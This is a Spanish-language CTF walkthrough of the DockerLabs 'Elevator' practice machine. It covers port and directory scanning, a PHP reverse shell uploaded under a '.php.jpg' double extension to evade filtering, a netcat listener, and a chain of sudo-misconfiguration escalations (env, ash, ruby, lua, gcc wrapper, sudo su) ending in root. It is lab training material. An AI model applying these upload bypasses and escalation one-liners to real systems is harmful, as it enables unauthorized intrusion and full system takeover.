# Informe de Pentesting – Máquina Vulnerable *Elevator*

![Logo](/Elevator/Imagenes/Logo.png)

## Descripción General

Se descarga la máquina vulnerable *Elevator* desde la plataforma DockerLabs. El archivo comprimido se descomprime con:

```bash
unzip elevator.zip
```

Luego, se despliega la máquina con el script proporcionado:

```bash
sudo bash auto_deploy.sh elevator.tar
```

---

## 1. Verificación de Conectividad

Se comprueba que la máquina está activa y accesible mediante un *ping*:

```bash
ping -c4 172.17.0.2
```

![Ping](/Elevator/Imagenes/Ping.jpeg)

---

## 2. Reconocimiento

### 2.1 Escaneo de Puertos

Se realiza un escaneo completo de puertos para identificar servicios accesibles:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![Puertos](/Elevator/Imagenes/Puertos.jpeg)

Resultado: solo se encuentra el puerto 80 (HTTP) abierto.

Se extraen los puertos válidos con el script personalizado:

```bash
extractPorts allPorts.txt
```

### 2.2 Escaneo Avanzado

Con el puerto 80 confirmado, se realiza un escaneo con detección de versiones y scripts comunes:

```bash
nmap -sCV -p 80 172.17.0.2 -oN target.txt
```

Este comando permite detectar:

* Versiones de software del servidor web
* Posibles vulnerabilidades expuestas
* Archivos robots.txt u otros que den pistas

---

## 3. Análisis Web

Se accede al servicio web vía navegador, pero no se encuentra nada llamativo a simple vista.

![Página Principal](/Elevator/Imagenes/Pagina.jpeg)

---

## 4. Fuzzing y Enumeración de Directorios

Se realiza fuzzing con *Gobuster* para descubrir rutas ocultas:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
```

![Fuzzing](/Elevator/Imagenes/Fuzzing.jpeg)

Se descubren dos directorios, entre ellos `/themes`. Se hace fuzzing adicional sobre esa ruta:

```bash
gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
```

---

## 5. Descubrimiento de Funcionalidad Vulnerable

Se identifica la ruta `http://172.17.0.2/themes/archivo.html`, la cual permite subir archivos `.jpg`.

![Subida](/Elevator/Imagenes/Subir.jpeg)

También se encuentra:

* `http://172.17.0.2/themes/uploads/` → directorio donde se listan las imágenes subidas
* `http://172.17.0.2/themes/upload.php` → script encargado del upload

![Directorio Uploads](/Elevator/Imagenes/Directorio.jpeg)

---

## 6. Explotación – Reverse Shell

### 6.1 Preparación del Payload

Se crea una reverse shell PHP con doble extensión `.php.jpg` para evadir filtros de tipo MIME:

```php
nano php_reverseshell.php.jpg
```

![Reverse Shell GitHub](/Elevator/Imagenes/Gitrevershell.jpeg)
![Tricks](/Elevator/Imagenes/tricks.jpeg)

> ⚠️ Esta técnica funciona cuando el servidor evalúa el archivo por su contenido real y no solo por la extensión.

El archivo se sube con éxito:

![Archivo Subido](/Elevator/Imagenes/Archivo.jpeg)
![Subida Exitosa](/Elevator/Imagenes/Subida.jpeg)

### 6.2 Ejecución del Payload

Antes de ejecutar el archivo, se escucha en el puerto especificado dentro del script PHP:

```bash
sudo nc -lvnp 443
```

![Escucha](/Elevator/Imagenes/Escucha.jpeg)

Al acceder al archivo desde el navegador, se ejecuta la reverse shell y se obtiene acceso como `www-data`.

---

## 7. Escalada de Privilegios

### Cadena de Escalada:

1. **www-data → daphne**
   Puede ejecutar `/usr/bin/env` como `daphne` sin contraseña:

   ```bash
   sudo -u daphne /usr/bin/env /bin/bash
   ```

2. **daphne → vilma**
   `daphne` tiene permiso para ejecutar `ash` como `vilma`:

   ```bash
   sudo -u vilma /usr/bin/ash
   ```

3. **vilma → shaggy**
   `vilma` puede usar `ruby`:

   ```bash
   sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
   ```

4. **shaggy → fred**
   `shaggy` tiene permiso sobre `lua`:

   ```bash
   sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
   ```

5. **fred → scooby**
   `fred` puede ejecutar `gcc` con el wrapper:

   ```bash
   sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .
   ```

6. **scooby → root**
   `scooby` puede usar `sudo` como root directamente:

   ```bash
   sudo -u root /usr/bin/sudo su
   ```

![Intrusión](/Elevator/Imagenes/Intrusion.jpeg)
![Escalada](/Elevator/Imagenes/Escalada.jpeg)

---

## 8. Conclusión

Esta máquina representa un excelente ejemplo de cómo múltiples configuraciones incorrectas en `sudoers` pueden llevar a una escalada completa de privilegios, incluso cuando se comienza con un acceso mínimo desde una web shell.

Se destacan los siguientes problemas de seguridad:

* Falta de validación de contenido real en el sistema de subida de archivos.
* Configuración permisiva de múltiples usuarios con permisos `NOPASSWD`.
* Encadenamiento de privilegios entre usuarios sin control ni segmentación.
